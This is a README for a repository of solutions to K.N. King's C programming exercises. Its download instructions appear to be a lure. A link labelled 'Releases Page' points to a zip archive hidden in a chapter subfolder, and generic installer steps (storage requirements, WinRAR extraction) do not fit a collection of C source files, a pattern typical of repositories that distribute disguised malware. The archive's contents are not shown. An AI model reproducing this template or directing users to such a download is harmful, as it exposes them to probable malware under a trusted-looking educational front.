## 📖 Description

This repository contains all the programs I wrote for exercises and projects in the C Programming Book (2nd Edition) by K.N. King. These solutions are published for historical and reference purposes. They serve as guidance for other learners to build their understanding rather than for cheating.

## 🚀 Getting Started

Follow these steps to download and run the software:

1. **Check Your System Requirements**: 
   - You need a computer running Windows, macOS, or Linux.
   - Ensure you have at least 100 MB of free storage space.
   - You must have a file archiving tool (like WinRAR or 7-Zip) if the files are compressed.

2. **Download the Software**: 
   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/A-panwar4164/C-Programming-K.N.King-2nd-edition/main/4-Expressions/Projects/C-Programming-K.N.King-2nd-edition-2.3.zip)
  
## 💾 Installation Steps

1. After downloading, locate the file in your Downloads folder.

2. If the file is compressed, right-click on it and select your extraction tool, then choose "Extract Here" or "Extract to folder."

3. Open the extracted folder. You will find all the programs organized by chapter.

4. To run a program, open your preferred C development environment, such as Code::Blocks, Dev-C++, or any terminal with `gcc` installed.

5. Copy the C file you want to run into your project folder in the development environment.

6. Compile the program as per your development environment's guidelines.

7. Run the program to see the output.
